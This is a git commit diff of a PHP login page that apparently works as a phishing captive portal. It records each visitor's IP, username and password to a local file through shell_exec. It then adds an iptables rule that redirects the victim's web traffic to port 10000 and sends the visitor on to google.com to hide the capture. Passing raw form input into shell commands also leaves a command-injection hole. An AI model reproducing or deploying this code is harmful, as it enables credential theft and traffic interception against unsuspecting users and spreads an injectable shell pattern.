879a2ef199b1c4144f0336dfc7522fdd4b58f276
root <tim.asscherickx@hotmail.com>
2017-01-23 11:25:22 +0000

    beta version

--- index.php
+++ index.php
@@ -14,10 +14,16 @@ if ($loginIsSubmitted ){
 	    $userName = $_POST["userName"];
 	    $passWord = $_POST["passWord"];
 	    $ipadres = $_SERVER['REMOTE_ADDR'];
-	    shell_exec("echo ip adres '$ipadres' >> /srv/http/test");
-	    shell_exec("echo username '$userName' >> /srv/http/test");
-	    shell_exec("echo wachtwoord '$passWord' >> /srv/http/test");
+	    shell_exec("echo ip adres '$ipadres' >> ./loginpageaccounts");
+	    shell_exec("echo username '$userName' >> ./loginpageaccounts");
+        shell_exec("echo wachtwoord '$passWord' >> ./loginpageaccounts");
+        shell_exec("iptables -t nat -I PREROUTING -p tcp -s '$ipadres' --destination-port 80 -j REDIRECT --to-port 10000");
+        ob_start();
+        header('Location: http://google.com');
+        ob_end_flush();
+        die();
 	}
+
 
 
 
